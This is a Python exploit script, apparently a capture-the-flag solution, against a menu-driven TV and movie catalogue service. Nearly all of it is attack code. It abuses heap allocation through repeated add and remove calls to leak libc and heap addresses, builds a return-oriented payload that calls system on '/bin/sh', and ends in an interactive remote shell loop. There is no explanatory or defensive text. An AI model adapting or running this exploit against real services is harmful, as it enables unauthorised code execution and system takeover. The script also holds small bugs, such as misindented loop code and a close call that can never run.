#!/usr/bin/env python
import socket
import struct
import telnetlib
import time

#s = socket.create_connection(("119.254.101.197", 10003))
s = socket.create_connection(("127.0.0.1", 5555))
#s = socket.create_connection(("192.168.1.255", 4444))
def rt(delim):
    buf = ""
    while not delim in buf:
        buf += s.recv(1)
    #print buf
    return buf
def rall():
    buf = ""
    s.setblocking(0)
    begin = time.time()
    while 1:
        if buf is not "" and time.time() - begin > .5:
            break
        elif time.time() - begin > 1:
            break
    try:
        data = s.recv(4096)
        if data:
            begin = time.time()
            buf += data
        else:
            time.sleep(.1)
    except:
        pass
    return buf
def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
    
def add_tv(name,season,rating,introduction):
    s.sendall("1\n")
    rt("name? ")
    s.sendall(name+"\n")
    rt("Season? ")
    s.sendall(season+"\n")
    rt("ting? ")
    s.sendall(rating+"\n")
    rt("duction? ")
    s.sendall(introduction+"\n")
    return rt("choice? ")

def add_mov(name, actors,rating,introduction):
    s.sendall("2\n")
    rt("name?")
    s.sendall(name+"\n")
    rt("Actors? ")
    s.sendall(actors+"\n")
    rt("ting? ")
    s.sendall(rating+"\n")
    rt("duction? ")
    s.sendall(introduction+"\n")
    return rt("choice? ")

def remove(name):
    s.sendall("3\n")
    #rt("remove? ")
    s.sendall(name+"\n")
    #rt("choice? ")
def mlist():
    s.sendall("4\n")
    tmp = rt("choice? ")
    return tmp

def get_libc_print(buf):
    pos =buf.find("actors:")
    buf1 = buf[pos+20:]
    pos1 = buf1.find("actors:")
    buf2 = buf1[pos1+8:pos1+14]
    print buf2.encode("hex")
    return buf2

def get_heap_print(buf):
    pos  = buf.find("actors:")
    buf1 = buf[pos+20:]
    pos1 = buf1.find("actors:")
    buf2 = buf1[pos1+20:]
    pos2 = buf2.find("actors:")
    buf3 = buf2[pos2+20:]
    pos3 = buf3.find("actors:")
    buf4 = buf3[pos3+8:pos3+13]
    print buf4.encode("hex")
    return buf4

def go():

    #aw_input("a")
    offset_remote = 0x7fbc379ca400 - 0x7fbc379bc52c#640 # printf - system
    offset_local = 0x7f837d2e9400 - 0x7f837d2db52c#640
    pop_edi_ret = 0x401293
    add_tv('a'*63,'1'*15,'1'*15,'1'*127)
    add_tv('a'*63,'1'*15,'1'*15,'1'*127)
    add_tv('a'*63,'1'*15,'1'*15,'1'*127)

    remove('a'*63)

    add_mov('b'*63,struct.pack('Q',0x00000000004015b0)+ 'b'*63 + '\x00' + 127 * 'c'+'\x00' + struct.pack('Q',0x10) + struct.pack('Q',0x000000601c29),'1'*15,'1'*127)
    tmp = get_libc_print(mlist())
    pos = tmp.find("0a")
    addr1 = tmp[:pos]
    addr1 = '\x00'+addr1+'\x00'+'\x00'
    print addr1.encode("hex")
    lib_addr = struct.unpack("Q",addr1)[0]
    #print hex(lib_addr)
    
    remove('b'*63)
    remove('b'*63)
    remove('b'*63)
    #read heap
    
    add_tv('a'*63,'1'*15,'1'*15,'1'*127)
    add_tv('a'*63,'1'*15,'1'*15,'1'*127)
    add_tv('a'*63,'1'*15,'1'*15,'1'*127)

    remove('a'*63)

    add_mov('b'*63,struct.pack('Q',0x00000000004015b0)+ 'b'*63 + '\x00' + 127 * 'c'+'\x00' + struct.pack('Q',0x10) + struct.pack('Q',0x601DC0+0x20),'1'*15,'1'*127)
    tmp = get_heap_print(mlist())
    pos = tmp.find("0a")
    addr= tmp[:pos]
    heap_addr = struct.unpack("I",addr)[0]
    print hex(heap_addr)
    
    payload = struct.pack('Q',pop_edi_ret)+struct.pack('Q',heap_addr+0x50)+struct.pack('Q',lib_addr-offset_local)+'\x90'*39

    remove('b'*63)
    #raw_input('pause')
    for i in range(16):
        add_tv('a'*63,'1'*15,'1'*15,'1'*127)
    remove('a'*63)
    raw_input('pause')
    add_mov('b'*8+"\x15\x09\x40\x00\x00\x00\x00\x00"+"mmmmmmmm"+"b"*39,struct.pack("Q",heap_addr)+payload + '\x00' + 'xxxxxxxx',15 * '1', '1'*8+'/bin/sh\x00'+'1'*111)
    remove(payload)
    


go()
print("[+] Shell ready:")

while 1:
    s.send(raw_input('#')+'\x0a')
    print s.recv(1024)
sock.close()
